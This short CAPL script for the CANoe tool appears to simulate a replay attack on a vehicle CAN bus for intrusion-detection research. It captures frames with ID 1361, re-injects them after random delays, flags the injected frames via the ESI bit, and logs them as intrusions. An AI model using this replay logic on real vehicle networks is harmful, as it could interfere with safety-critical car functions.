/*@!Encoding:1250*/
includes
 { 
 }
variables
 {
  byte i;
  message CAN.* m_attack;
  timer t_attack,t1,t2;
  double delay_5=5000;
  double delay_10=0;
  double delay_20=0;
  double delay_40=0;
  double delay_100=0;
  int epsilon;
 }
on timer t_attack
 {
    m_attack.ESI=1;
    output(m_attack);
 }
on timer t1
{
  m_attack.ESI=1;
  output(m_attack);
}
on timer t2
{
  m_attack.ESI=1;
  output(m_attack);
}
on message CAN1.*
{
  if(this.ESI==1)
  {
    writeToLogEx("intrusion");
  }
  else
  {
    epsilon=random(100);
    if(epsilon<50)
    {
      if(this.id==1361)
		{
			if(isTimerActive(t1)==0)
			{
				delay_100=random(100000);
				m_attack=this;
				setTimer(t1,0,delay_100*1000);
			}
			else if(isTimerActive(t2)==0)
			{
				delay_100=random(100000);
				m_attack=this;
				setTimer(t2,0,delay_100*1000);
			}
		}    
    }
  }
}